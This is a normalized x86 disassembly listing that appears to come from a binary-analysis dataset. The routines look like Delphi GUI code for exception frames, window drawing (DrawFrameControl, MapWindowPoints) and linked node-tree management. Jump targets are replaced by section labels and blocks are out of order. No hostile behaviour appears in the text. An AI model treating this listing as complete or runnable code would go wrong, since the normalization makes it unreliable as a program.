call sub_4992b8
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4992e0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4992b8
call sub_499c04
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4992e0
call sub_499c04
pop ecx
sub_499d18
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_499b7c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_4992e0
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0x90 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_499534
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_4992e0
call sub_499c04
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_499da0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_499e46
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor edx edx
call sub_449d2c
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_499e4d
lea eax [ ebp - 0xc ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44b0fc
retn
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0xc ]
call sub_43ca24
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_43c954
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_449d2c
sub_499e54
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_49a197
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0xc ]
call sub_49a758
mov eax [ ebp - 0xc ]
movzx eax [ eax + 0x74 ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0xc ]
call sub_4994c4
xor eax eax
push ebp
push sub_49a172
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x1c ] 0x40000
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x70 ]
cmp eax [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x74 ] 0x0
mov [ ebp - 0x26 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x70 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] 0x0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x0
lea eax [ ebp - 0x40 ]
push eax
push 0x1
lea edx [ ebp - 0x44 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
mov eax [ ebp - 0xc ]
lea edx [ eax + 0x74 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x26 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x20 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0xc ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
inc eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] 0x0
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
movzx edx [ ebp - 0x26 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0xc ]
call sub_49b8bc
mov edx [ ebp - 0xc ]
mov [ edx + 0x68 ] eax
inc [ ebp - 0x1c ]
dec [ ebp - 0x30 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
mov si 0xffb7
call sub_4483f8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49a179
mov eax [ ebp - 0xc ]
movzx edx [ ebp - 0x25 ]
mov [ eax + 0x74 ] dl
mov eax [ ebp - 0xc ]
cmp [ eax + 0x64 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_498c44
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
push ebp
lea eax [ ebp - 0x8 ]
call sub_499da0
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_48deb0
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_48ede4
mov eax [ ebp - 0xc ]
call sub_4994c8
retn
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_498c44
mov edx [ ebp - 0xc ]
mov [ edx + 0x64 ] eax
push ebp
lea eax [ ebp - 0x8 ]
call sub_499da0
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movzx edx [ ebx + 0x10 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov edx [ ebx + 0x20 ]
mov eax [ ebp - 0xc ]
call sub_49b8bc
mov [ ebx + 0x20 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_498fac
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_4481b0
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
cmp [ esi + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] esi
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x14 ]
test eax eax
jle r-xdata
mov [ ebp - 0x2c ] esi
mov esi [ esi + 0x18 ]
mov eax [ ebp - 0x2c ]
call sub_4481b0
mov eax [ ebp - 0x24 ]
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x24 ]
mov [ ebx + 0x18 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x24 ] eax
inc [ ebp - 0x1c ]
dec [ ebp - 0x30 ]
jne r-xdata
sub_49a1a8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_432a2c
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
push 0x0
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_46e8c8
push eax
call DrawFrameControl
call sub_44c2c8
lea ecx [ ebp - 0xc ]
mov dl 0x34
call sub_44cac4
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_46e8c8
push eax
call sub_44c2c8
lea ecx [ ebp - 0xc ]
pop edx
call sub_44c524
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49a23c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_46dc10
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_46e3d8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx edi
call sub_46e378
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_46e378
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_46dc10
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_46e378
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_46e378
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_49a2c4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp + 0xc ]
mov edx edi
mov eax esi
call sub_432a2c
call sub_44c2c8
lea ecx [ ebp - 0xc ]
mov edx ebx
call sub_44c738
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_46e8c8
push eax
call sub_44c2c8
lea ecx [ ebp - 0xc ]
pop edx
call sub_44c490
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_49a320
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_49a1a8
pop ecx
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_49a1a8
pop ecx
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_49a23c
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_49a23c
pop ecx
push ebp
mov edx [ ebx + 0x8 ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x18 ]
sub edx 0x2
push edx
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0xa
push edx
mov ecx eax
inc ecx
mov edx [ ebx ]
add edx 0x2
mov al 0x2
call sub_49a2c4
pop ecx
jmp r-xdata
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_49a23c
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_49a23c
pop ecx
jmp r-xdata
push ebp
mov eax [ ebx ]
mov edx eax
add edx 0xa
push edx
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov ecx [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
add ecx [ edx + 0x18 ]
inc ecx
mov edx eax
inc edx
mov al 0x3
call sub_49a2c4
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_49a474
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e0ac
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_49a598
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_48c730
mov eax [ ebp - 0x4 ]
call sub_46e3b0
xor eax eax
push ebp
push sub_49a57b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46e950
xor eax eax
push ebp
push sub_49a55e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_492534
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49a565
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46e950
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0x90 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4924f8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_48d81c
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
sub_49a5a8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_495170
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_48d8bc
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_48d878
mov ecx eax
xor edx edx
xor eax eax
call sub_432a2c
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x8c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_496868
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
movzx eax [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx 0x2
add eax 0xc
push eax
mov eax [ eax ]
cdq
idiv ecx
pop edx
mov [ edx ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
movzx edx [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
movzx eax [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov ecx 0x2
add eax 0x8
push eax
mov eax [ eax ]
cdq
idiv ecx
pop edx
mov [ edx ] eax
jmp r-xdata
dec al
je r-xdata
movzx eax [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_432b40
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_49a724
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_49a724
pop ecx
mov eax ebx
call sub_4481b0
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_49a724
pop ecx
sub_49a758
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_49a724
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_4481b0
xor eax eax
mov [ esi + 0x64 ] eax
sub_49a7b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_499534
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_49a7f4
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x8c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x80 ]
sub_49a7f4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_49aa85
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_44be28
mov edx [ ebp - 0x8 ]
pop eax
call sub_44a068
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
mov eax [ ebx + 0x14 ]
call sub_498c80
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_44be28
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_44be28
mov edx [ ebp - 0x10 ]
pop eax
call sub_44a068
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_4481b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49aa8c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call j_sub_44936c
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_499060
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_4991dc
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_499218
mov eax [ ebx + 0x18 ]
call sub_499060
mov [ edx + 0x18 ] eax
push esi
push sub_49b178
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_49959c
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_499218
mov eax [ esi + 0x64 ]
call sub_4991dc
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_4481b0
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_49b150
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_4481b0
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_498d38
mov edx eax
mov eax edi
call sub_499204
mov eax edi
call sub_499060
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_4481b0
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x18 ]
mov [ eax + 0x18 ] edx
mov edx [ edi + 0x8 ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
push esi
push sub_49b178
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_49959c
jmp r-xdata
mov edx [ edi + 0x8 ]
mov edx [ edx + 0x18 ]
mov [ edx + 0xc ] eax
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
push esi
push sub_49b178
mov edx [ eax + 0x14 ]
mov eax esi
call sub_49959c
mov eax [ ebx + 0x14 ]
call sub_4481b0
mov eax edi
call sub_4481b0
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_49aa94
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x38 ] 0x0
jne r-xdata
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_495170
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x20
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
movzx edx [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x20 ]
mov eax esp
call sub_432a08
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_499204
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_4950dc
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_499204
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_49aff8
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_49b178
xor edx edx
mov eax edi
call sub_49959c
sub_49ab78
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4991dc
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_447960
mov edx eax
mov eax ebx
call sub_499204
sub_49abe4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_49ac60
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_43ca24
lea ecx [ ebp - 0x4 ]
mov edx ebx
call sub_43c500
mov eax [ ebp - 0x4 ]
call sub_44af28
mov [ ebp - 0x8 ] eax
